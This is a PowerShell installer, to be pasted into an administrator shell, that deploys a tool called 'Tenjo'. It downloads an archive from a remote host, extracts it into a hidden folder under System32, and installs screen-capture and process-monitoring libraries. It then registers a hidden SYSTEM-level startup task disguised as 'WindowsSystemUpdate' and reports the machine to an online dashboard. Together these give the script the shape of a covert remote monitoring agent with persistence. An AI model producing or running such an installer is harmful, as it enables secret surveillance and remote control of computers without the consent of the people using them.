# FIXED VERSION 2 - PowerShell Script with Better File Extraction
# Copy this entire block and paste in PowerShell (Run as Administrator)

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "Run as Administrator!" -ForegroundColor Red
    Read-Host
    exit
}

Write-Host "Installing Python and Deploying Tenjo..." -ForegroundColor Green

# Check Python
try {
    $pythonVersion = python --version 2>&1
    if (-not ($pythonVersion -match "Python 3\.(10|11|12)")) {
        throw "Need Python"
    }
    Write-Host "Python already installed: $pythonVersion" -ForegroundColor Green
} catch {
    Write-Host "Installing Python 3.10..." -ForegroundColor Yellow
    $pythonInstaller = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe" -OutFile $pythonInstaller -UseBasicParsing
    Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_pip=1" -Wait
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
    Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
    Write-Host "Python installed successfully" -ForegroundColor Green
}

# Stop existing processes
Get-Process -Name python -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# Clean old installation
if (Test-Path "C:\Windows\System32\.tenjo") {
    Remove-Item "C:\Windows\System32\.tenjo" -Recurse -Force -ErrorAction SilentlyContinue
}

# Create directories
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo" -Force | Out-Null

# Download installer
try {
    Write-Host "Downloading Tenjo installer..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri "https://tenjo.adilabs.id/downloads/installer_package.tar.gz" -OutFile "$env:TEMP\tenjo.tar.gz" -UseBasicParsing
    Write-Host "Downloaded successfully (29MB)" -ForegroundColor Green
} catch {
    Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host
    exit
}

# Extract installer directly to temp, then copy
try {
    Write-Host "Extracting installer..." -ForegroundColor Cyan
    
    # Extract to temp directory first
    $tempExtract = "$env:TEMP\tenjo_extract"
    if (Test-Path $tempExtract) {
        Remove-Item $tempExtract -Recurse -Force
    }
    New-Item -ItemType Directory -Path $tempExtract -Force | Out-Null
    
    if (Get-Command tar -ErrorAction SilentlyContinue) {
        tar -xzf "$env:TEMP\tenjo.tar.gz" -C $tempExtract
    } else {
        Write-Host "Tar command not found - manual extraction needed" -ForegroundColor Red
        exit
    }
    
    # Copy files from extracted folder to installation directory
    $extractedFolder = Get-ChildItem $tempExtract | Where-Object {$_.PSIsContainer} | Select-Object -First 1
    if ($extractedFolder) {
        Write-Host "Copying files from $($extractedFolder.Name)..." -ForegroundColor Cyan
        Copy-Item "$($extractedFolder.FullName)\*" -Destination "C:\Windows\System32\.tenjo\" -Recurse -Force
    } else {
        # If no subfolder, copy directly
        Copy-Item "$tempExtract\*" -Destination "C:\Windows\System32\.tenjo\" -Recurse -Force
    }
    
    # Clean up temp extraction
    Remove-Item $tempExtract -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Files extracted and copied successfully" -ForegroundColor Green
    
} catch {
    Write-Host "Extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    exit
}

# Install dependencies
Set-Location "C:\Windows\System32\.tenjo"
Write-Host "Installing Python dependencies..." -ForegroundColor Cyan

# List directory contents for debugging
Write-Host "Installation directory contents:" -ForegroundColor Yellow
Get-ChildItem -Name | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }

# Install dependencies
if (Test-Path "requirements.txt") {
    Write-Host "Found requirements.txt, installing..." -ForegroundColor Green
    python -m pip install --upgrade pip --quiet
    python -m pip install -r requirements.txt --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org
} else {
    Write-Host "requirements.txt not found, installing critical packages..." -ForegroundColor Yellow
    python -m pip install --upgrade pip --quiet
    python -m pip install requests psutil pillow mss websocket-client pygetwindow pywin32 wmi --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org
}
Write-Host "Dependencies installation completed" -ForegroundColor Green

# Create scheduled task
Write-Host "Creating startup task..." -ForegroundColor Cyan
$action = New-ScheduledTaskAction -Execute "python" -Argument "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero)
$principal = New-ScheduledTaskPrincipal -UserID "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsSystemUpdate" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null

# Start service
Write-Host "Starting Tenjo service..." -ForegroundColor Cyan
if (Test-Path "main.py") {
    Start-Process python "main.py" -WorkingDirectory "C:\Windows\System32\.tenjo" -WindowStyle Hidden
    Write-Host "Tenjo service started successfully" -ForegroundColor Green
} else {
    Write-Host "main.py not found in installation directory" -ForegroundColor Red
}

# Cleanup
Remove-Item "$env:TEMP\tenjo.tar.gz" -Force -ErrorAction SilentlyContinue

# Final verification
Write-Host "Final verification..." -ForegroundColor Cyan
if (Test-Path "main.py") {
    Write-Host "✓ main.py found" -ForegroundColor Green
} else {
    Write-Host "✗ main.py missing" -ForegroundColor Red
}

if (Test-Path "requirements.txt") {
    Write-Host "✓ requirements.txt found" -ForegroundColor Green
} else {
    Write-Host "✗ requirements.txt missing" -ForegroundColor Yellow
}

$task = Get-ScheduledTask -TaskName "WindowsSystemUpdate" -ErrorAction SilentlyContinue
if ($task) {
    Write-Host "✓ Startup task created" -ForegroundColor Green
} else {
    Write-Host "✗ Startup task failed" -ForegroundColor Red
}

Write-Host "Deployment completed!" -ForegroundColor Green
Write-Host "Check dashboard: https://tenjo.adilabs.id" -ForegroundColor Cyan
Write-Host "This PC will appear online within 1-2 minutes" -ForegroundColor Yellow

Read-Host "Press Enter to exit"